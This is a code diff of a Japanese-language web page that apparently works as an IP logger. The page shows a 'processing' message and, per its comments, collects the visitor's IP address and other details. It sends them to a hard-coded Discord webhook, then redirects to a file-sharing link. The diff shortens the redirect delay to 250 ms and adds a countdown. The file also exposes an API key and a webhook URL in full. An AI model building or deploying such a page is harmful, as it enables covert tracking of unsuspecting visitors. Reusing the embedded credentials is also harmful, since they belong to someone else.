@@ -29,12 +29,18 @@
             color: #2ecc71;
             margin-top: 15px;
         }
+        .countdown {
+            font-weight: bold;
+            color: #3498db;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h2 id="status-title">情報を処理中です...</h2>
         <p id="status-message">まもなくリダイレクトします</p>
+        <div id="countdown" class="countdown" style="display: none;"></div>
         <div id="error-message" class="error" style="display: none;"></div>
     </div>
 
@@ -43,6 +49,7 @@
         const IPIFY_API_KEY = "at_J8ZKGW0bpTAwgzuAWbPD7jh6qQtnH"; // IPifyのAPIキー
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532580581722951771/iZJ3O-Qkt9gjk8oo0p_ViEcnkveUPgzs1mb_zBn7P0xFQVqHuMWBc9kVz7qN_Ij7RysX"; // DiscordのWebhook URL
         const REDIRECT_URL = "https://6.gigafile.nu/1031-b55d28e71d81aa40947038e771f224888"; // リダイレクト先のURL
+        const REDIRECT_DELAY = 250; // リダイレクトまでの待ち時間（ミリ秒）
         // ----------------------------------------------
 
         // IPアドレスとその他情報を取得してDiscordに送信するメイン関数
@@ -50,6 +57,7 @@
             const statusTitle = document.getElementById('status-title');
             const statusMessage = document.getElementById('status-message');
             const errorMessage = document.getElementById('error-message');
+            const countdown = document.getElementById('countdown');
 
             // APIキーとWebhook URLが設定されているかチェック
             if (IPIFY_API_KEY === "YOUR_API_KEY" || DISCORD_WEBHOOK_URL.includes("YOUR_WEBHOOK_ID")) {
@@ -116,19 +124,39 @@
                 // 5. 送信後、指定したURLにリダイレクト
                 statusTitle.textContent = "情報の送信が完了しました";
                 statusMessage.textContent = "まもなくリダイレクトします";
+                startCountdown(REDIRECT_DELAY);
                 
                 setTimeout(() => {
                     window.location.href = REDIRECT_URL;
-                }, 2000);
+                }, REDIRECT_DELAY);
 
             } catch (error) {
                 showError(`エラーが発生しました: ${error.message}`);
                 
                 // エラー時もリダイレクト
+                startCountdown(REDIRECT_DELAY);
                 setTimeout(() => {
                     window.location.href = REDIRECT_URL;
-                }, 3000);
+                }, REDIRECT_DELAY);
             }
+        }
+
+        function startCountdown(delay) {
+            const countdown = document.getElementById('countdown');
+            countdown.style.display = "block";
+            
+            let secondsLeft = Math.ceil(delay / 1000);
+            countdown.textContent = `${secondsLeft}秒後にリダイレクトします`;
+            
+            const countdownInterval = setInterval(() => {
+                secondsLeft--;
+                if (secondsLeft > 0) {
+                    countdown.textContent = `${secondsLeft}秒後にリダイレクトします`;
+                } else {
+                    countdown.textContent = "リダイレクト中...";
+                    clearInterval(countdownInterval);
+                }
+            }, 1000);
         }
 
         function showError(message) {
